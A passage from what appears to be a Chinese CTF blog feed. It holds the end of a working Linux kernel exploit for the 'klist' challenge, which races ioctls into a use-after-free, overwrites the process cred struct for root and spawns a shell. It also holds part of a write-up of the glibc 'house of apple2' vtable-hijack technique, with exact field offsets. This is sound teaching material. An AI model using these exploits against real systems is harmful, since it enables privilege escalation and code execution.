class="params">(<span class="keyword">char</span> *a, <span class="keyword">int</span> alen, <span class="keyword">char</span> *b, <span class="keyword">int</span> blen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= alen - blen; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; blen; ++j)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (a[i + j] != b[j])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (j &gt;= blen)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">create_chunk_arg</span> <span class="title">create_arg</span>;</span></span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">    <span class="keyword">int</span> fd;</span><br><span class="line">    <span class="keyword">char</span> *res = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    fd = open(<span class="string">&quot;/dev/klist&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-]open file error\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x200</span>);</span><br><span class="line">    create_arg.size = <span class="number">96</span> - <span class="number">0x18</span>;</span><br><span class="line">    create_arg.buf = buf;</span><br><span class="line">    ioctl(fd, <span class="number">0x1337</span>, &amp;create_arg);</span><br><span class="line">    <span class="keyword">if</span> (fork() == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            ioctl(fd, <span class="number">0x1337</span>, &amp;create_arg);</span><br><span class="line">            ioctl(fd, <span class="number">0x133A</span>, res);</span><br><span class="line">            <span class="keyword">if</span> (*(<span class="keyword">int</span> *)res == <span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[*]get the UAF chunk!\n&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-]gg\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1500</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ioctl(fd, <span class="number">0x133A</span>, res);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fork() == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">msg</span> <span class="title">msg</span>;</span></span><br><span class="line">            <span class="keyword">int</span> i;</span><br><span class="line">            <span class="built_in">memset</span>(msg.mtext, <span class="number">0x42</span>, BUFF_SIZE - <span class="number">1</span>);</span><br><span class="line">            msg.mtext[BUFF_SIZE] = <span class="number">0</span>;</span><br><span class="line">            msg.mtype = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; BUFF_SIZE; i++)</span><br><span class="line">                msg.mtext[i] = <span class="string">&#x27;\xff&#x27;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span> msqid = msgget(IPC_PRIVATE, <span class="number">0644</span> | IPC_CREAT);</span><br><span class="line"></span><br><span class="line">            msgsnd(msqid, &amp;msg, <span class="keyword">sizeof</span>(msg.mtext), <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(res, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x1338</span>, <span class="number">0</span>);</span><br><span class="line">    read(fd, res, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">if</span> (*(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> *)res == <span class="number">0x6161616161616161</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] cannot realloc the chunk &quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] now we can read everywhere&quot;</span>);</span><br><span class="line">    <span class="keyword">char</span> *mem = <span class="built_in">malloc</span>(<span class="number">0x300000</span>);</span><br><span class="line">    read(fd, mem, <span class="number">0x300000</span>);</span><br><span class="line">    <span class="keyword">char</span> cred[<span class="number">0x20</span>];</span><br><span class="line">    *(<span class="keyword">size_t</span> *)cred = <span class="number">0x000003e800000003</span>;</span><br><span class="line">    *(<span class="keyword">size_t</span> *)(cred + <span class="number">8</span>) = <span class="number">0x000003e8000003e8</span>;</span><br><span class="line">    *(<span class="keyword">size_t</span> *)(cred + <span class="number">0x10</span>) = <span class="number">0x000003e8000003e8</span>;</span><br><span class="line">    *(<span class="keyword">size_t</span> *)(cred + <span class="number">0x18</span>) = <span class="number">0x000003e8000003e8</span>;</span><br><span class="line">    <span class="keyword">int</span> found = myMemmem(mem, <span class="number">0x300000</span>, cred, <span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">if</span> (found == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-]cannot find cred struct !&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> *<span class="keyword">final</span> = found + mem;</span><br><span class="line">    print_hex(<span class="keyword">final</span> - <span class="number">0x8</span>, <span class="number">0xb0</span>);</span><br><span class="line">    set_cred_root(<span class="keyword">final</span> - <span class="number">0x8</span>, <span class="number">0x40</span>, <span class="number">1000</span>);</span><br><span class="line">    print_hex(<span class="keyword">final</span> - <span class="number">0x8</span>, <span class="number">0xb0</span>);</span><br><span class="line">    write(fd, mem, found + <span class="number">0xb0</span>);</span><br><span class="line">    <span class="keyword">if</span> (getuid() == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+]now you are r00t,enjoy ur shell\n&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] there must be something error ... &quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就是成功的结果图：</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220807171554006.png"                      alt="image-20220807171554006"                ></p><p>题目我会放在：<a class="link"   href="https://github.com/196082/196082" >https://github.com/196082/196082<i class="fas fa-external-link-alt"></i></a></p><hr><p>参考链接：</p><p><a class="link"   href="http://p4nda.top/2018/11/27/wctf-2018-klist/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8" >http://p4nda.top/2018/11/27/wctf-2018-klist/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://xz.aliyun.com/t/2814" >https://xz.aliyun.com/t/2814<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;题目分析&quot;&gt;&lt;a href=&quot;#题目分析&quot; class=&quot;headerlink&quot; title=&quot;题目分析&quot;&gt;&lt;/a&gt;题目分析&lt;/h2&gt;&lt;p&gt;题目实现的功能很容易看出来&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td c</summary>
      
    
    
    
    <category term="kernel-pwn" scheme="https://cv196082.gitee.io/categories/kernel-pwn/"/>
    
    
    <category term="heap spray" scheme="https://cv196082.gitee.io/tags/heap-spray/"/>
    
    <category term="Double Fetch" scheme="https://cv196082.gitee.io/tags/Double-Fetch/"/>
    
  </entry>
  
  <entry>
    <title>house of apple续</title>
    <link href="https://cv196082.gitee.io/2022/08/05/house-of-apple2/"/>
    <id>https://cv196082.gitee.io/2022/08/05/house-of-apple2/</id>
    <published>2022-08-05T07:10:34.000Z</published>
    <updated>2022-08-05T07:11:05.000Z</updated>
    
    <content type="html"><![CDATA[<p>死都想不到house of apple居然有三篇文章，这里就把第二篇和第三篇合并起来一起学完吧。</p><h2 id="house-of-apple2"><a href="#house-of-apple2" class="headerlink" title="house of apple2"></a>house of apple2</h2><h3 id="利用条件："><a href="#利用条件：" class="headerlink" title="利用条件："></a>利用条件：</h3><ol><li><p>已知<code>heap</code>地址和<code>glibc</code>地址</p></li><li><p>能控制程序执行<code>IO</code>操作，包括但不限于：从<code>main</code>函数返回、调用<code>exit</code>函数、通过<code>__malloc_assert</code>触发</p></li><li><p>能控制<code>_IO_FILE</code>的<code>vtable</code>和<code>_wide_data</code>，一般使用<code>largebin attack</code>去控制</p></li></ol><h3 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h3><p>在<a href="https://cv196082.gitee.io/2022/02/23/FSOP/">https://cv196082.gitee.io/2022/02/23/FSOP/</a> 这篇文章中详细介绍了去调用vtable中的函数指针时会经过什么验证。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_read_ptr;    <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_read_end;    <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_read_base;    <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_write_base;    <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_write_ptr;    <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_write_end;    <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_buf_base;    <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_buf_end;        <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_save_base;    <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_backup_base;    <span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">                   backup area */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_save_end;    <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="keyword">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> _<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="keyword">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *_<span class="title">wide_vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>注意_IO_wide_data结构体中存在_wide_vtable成员，在调用_wide_vtable虚表是同样会经过一系列宏去调用：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_WIDE_JUMPS(THIS) \</span></span><br><span class="line"><span class="meta">  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable</span></span><br></pre></td></tr></table></figure><p>在这里调用的顺序中没有出现vtable是否合法的检测，因此我们可以劫持_IO_FILE的vtable为_IO_wfile_jumps，控制_wide_data为可以控制的堆空间，进一步控制_wide_data-&gt;_wide_vtable指向可以控制的堆地址，控制程序IO流函数调用，最终调用到IO_wxxxxx</p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>这里最终目的是调用_wide_vtable成员，所以需要找到上述宏的调用，最终发现只存在以下四个：_IO_WSETBUF、_IO_WUNDERFLOW、_IO_WDOALLOCATE、_IO_WOVERFLOW</p><p>并且其中前两个还是利用难度较高，甚至是无法利用。下面从原文的三个方向出发</p><h4 id="IO-wfile-overflow"><a href="#IO-wfile-overflow" class="headerlink" title="_IO_wfile_overflow"></a><strong>_IO_wfile_overflow</strong></h4><p>这里的调用链为：<code>_IO_wfile_overflow</code>=&gt;<code>_IO_wdoallocbuf</code>=&gt;<code>_IO_WDOALLOCATE</code>=&gt;<code>*(fp-&gt;_wide_data-&gt;_wide_vtable+ 0x68)(fp)</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">wint_t</span></span><br><span class="line">    _IO_wfile_overflow (FILE *f, <span class="keyword">wint_t</span> wch)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">        f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">        __set_errno (EBADF);</span><br><span class="line">        <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">    <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">        <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_write_base == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            _IO_wdoallocbuf (f);</span><br><span class="line">           ......</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要满足<code>f-&gt;_flags &amp; _IO_NO_WRITES == 0</code>并且<code>f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING == 0</code>和<code>f-&gt;_wide_data-&gt;_IO_write_base == 0</code></p><p>接着看_IO_wdoallocbuf</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">_IO_wdoallocbuf (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED))</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">wint_t</span>)_IO_WDOALLOCATE (fp) != WEOF)</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  _IO_wsetb (fp, fp-&gt;_wide_data-&gt;_shortbuf,</span><br><span class="line">             fp-&gt;_wide_data-&gt;_shortbuf + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_wdoallocbuf)</span><br></pre></td></tr></table></figure><p>这里就调用了IO_Wxxxx并且需要满足<code>fp-&gt;_wide_data-&gt;_IO_buf_base != 0</code>和<code>fp-&gt;_flags &amp; _IO_UNBUFFERED == 0</code>。</p><p>所以总的来说构造方式为：</p><ol><li>_flags = ~(2 | 0x8 | 0x800)即可，所以可以直接设置为0或者这值为<code>  sh;</code></li><li><code>vtable</code>设置为<code>_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_overflow</code>即可</li><li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li><li><code>_wide_data-&gt;_IO_write_base</code>设置为<code>0</code>，即满足<code>*(A + 0x18) = 0</code></li><li><code>_wide_data-&gt;_IO_buf_base</code>设置为<code>0</code>，即满足<code>*(A + 0x30) = 0</code></li><li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li><li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x68) = C</code></li></ol><h4 id="IO-wfile-underflow-mmap"><a href="#IO-wfile-underflow-mmap" class="headerlink" title="_IO_wfile_underflow_mmap"></a><strong>_IO_wfile_underflow_mmap</strong></h4><p>调用链：<code>_IO_wfile_underflow_mmap</code>=&gt;<code>_IO_wdoallocbuf</code>=&gt;<code>_IO_WDOALLOCATE</code>=&gt;<code>*(fp-&gt;_wide_data-&gt;_wide_vtable +0x68)(fp)</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">wint_t</span></span><br><span class="line">_IO_wfile_underflow_mmap (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cd</span>;</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *read_stop;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line"> </span><br><span class="line">  cd = fp-&gt;_codecvt;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Maybe there is something left in the external buffer.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &gt;= fp-&gt;_IO_read_end</span><br><span class="line">      <span class="comment">/* No.  But maybe the read buffer is not fully set up.  */</span></span><br><span class="line">      &amp;&amp; _IO_file_underflow_mmap (fp) == EOF)</span><br><span class="line">    <span class="comment">/* Nothing available.  _IO_file_underflow_mmap has set the EOF or error</span></span><br><span class="line"><span class="comment">       flags as appropriate.  */</span></span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* There is more in the external.  Convert it.  */</span></span><br><span class="line">  read_stop = (<span class="keyword">const</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span> (fp-&gt;_wide_data-&gt;_IO_save_base);</span><br><span class="line">      fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">    &#125;</span><br><span class="line">      _IO_wdoallocbuf (fp);</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里需要改写的有点略多了，需要设置<code>fp-&gt;_flags &amp; _IO_NO_READS == 0</code>，设置<code>fp-&gt;_wide_data-&gt;_IO_read_ptr &gt;= fp-&gt;_wide_data-&gt;_IO_read_end</code>，设置<code>fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end</code>不进入调用，设置<code>fp-&gt;_wide_data-&gt;_IO_buf_base == NULL</code>和<code>fp-&gt;_wide_data-&gt;_IO_save_base == NULL</code>。</p><p>构造方式：</p><ol><li><code>_flags</code>设置为<code>~4</code>，如果不需要控制<code>rdi</code>，设置为<code>0</code>即可；如果需要获得<code>shell</code>，可设置为<code>  sh;</code></li><li><code>vtable</code>设置为<code>_IO_wfile_jumps_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_underflow_mmap</code>即可</li><li><code>_IO_read_ptr &lt; _IO_read_end</code>，即满足<code>*(fp + 8) &lt; *(fp + 0x10)</code></li><li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li><li><code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>，即满足<code>*A &gt;= *(A + 8)</code></li><li><code>_wide_data-&gt;_IO_buf_base</code>设置为<code>0</code>，即满足<code>*(A + 0x30) = 0</code></li><li><code>_wide_data-&gt;_IO_save_base</code>设置为<code>0</code>或者合法的可被<code>free</code>的地址，即满足<code>*(A + 0x40) = 0</code></li><li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li><li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x68) = C</code></li></ol><h4 id="IO-wdefault-xsgetn"><a href="#IO-wdefault-xsgetn" class="headerlink" title="_IO_wdefault_xsgetn"></a><strong>_IO_wdefault_xsgetn</strong></h4><p>调用链：<code>_IO_wdefault_xsgetn</code>=&gt;<code>__wunderflow</code>=&gt;<code>_IO_switch_to_wget_mode</code>=&gt;<code>_IO_WOVERFLOW</code>=&gt;<code>*(fp-&gt;_wide_data-&gt;_wide_vtable+0x18)(fp)</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span></span><br><span class="line">    _IO_wdefault_xsgetn (FILE *fp, <span class="keyword">void</span> *data, <span class="keyword">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">size_t</span> more = n;</span><br><span class="line">    <span class="keyword">wchar_t</span> *s = (<span class="keyword">wchar_t</span>*) data;</span><br><span class="line">    <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Data available. */</span></span><br><span class="line">        <span class="keyword">ssize_t</span> count = (fp-&gt;_wide_data-&gt;_IO_read_end</span><br><span class="line">                         - fp-&gt;_wide_data-&gt;_IO_read_ptr);</span><br><span class="line">        <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ((<span class="keyword">size_t</span>) count &gt; more)</span><br><span class="line">                count = more;</span><br><span class="line">            <span class="keyword">if</span> (count &gt; <span class="number">20</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                s = __wmempcpy (s, fp-&gt;_wide_data-&gt;_IO_read_ptr, count);</span><br><span class="line">                fp-&gt;_wide_data-&gt;_IO_read_ptr += count;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">                count = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">wchar_t</span> *p = fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line">                <span class="keyword">int</span> i = (<span class="keyword">int</span>) count;</span><br><span class="line">                <span class="keyword">while</span> (--i &gt;= <span class="number">0</span>)</span><br><span class="line">                    *s++ = *p++;</span><br><span class="line">                fp-&gt;_wide_data-&gt;_IO_read_ptr = p;</span><br><span class="line">            &#125;</span><br><span class="line">            more -= count;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (more == <span class="number">0</span> || __wunderflow (fp) == WEOF)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> n - more;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def 